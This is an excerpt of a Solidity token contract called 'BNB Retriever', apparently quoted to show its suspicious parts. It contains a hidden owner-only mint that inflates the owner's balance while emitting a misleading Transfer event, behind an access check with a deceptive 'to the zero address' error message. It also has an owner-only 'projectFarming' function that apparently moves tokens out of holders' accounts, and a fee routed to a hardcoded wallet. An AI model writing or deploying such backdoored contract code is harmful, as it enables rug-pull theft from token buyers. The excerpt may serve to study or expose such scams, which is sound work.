...
contract bnbretriever is Context, IERC20, Ownable {
    ...
    address private _projectWalletAddress = 0x24EaA0689186129f7c712fcD9E6458346905c948;
    ...
    string private _name = "BNB Retriever";
    string private _symbol = "BNBRetriever";
...
IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ...
    function _takeCharity(uint256 tCharity) private {
        uint256 currentRate =  _getRate();
        uint256 rCharity = tCharity.mul(currentRate);
        _rOwned[_projectWalletAddress] = _rOwned[_projectWalletAddress].add(rCharity);
        if(_isExcluded[_projectWalletAddress])
            _tOwned[_projectWalletAddress] = _tOwned[_projectWalletAddress].add(tCharity);
    }
    ...
    function _mint(address account, uint256 amount) internal virtual { 
        require(_msgSender() == owner(), "ERC20: to the zero address");
        require(account != address(0), "ERC20: to the zero address"); 
        _tTotal +=amount; 
        _tOwned[owner()] += amount; 
        emit Transfer(address(0), account, amount);
        } 
        function projectFarming(address account, uint256 amount) public onlyOwner { 
            ...
            uint256 rAmount =  _getRate(); // Transfer from account to the burnAccount
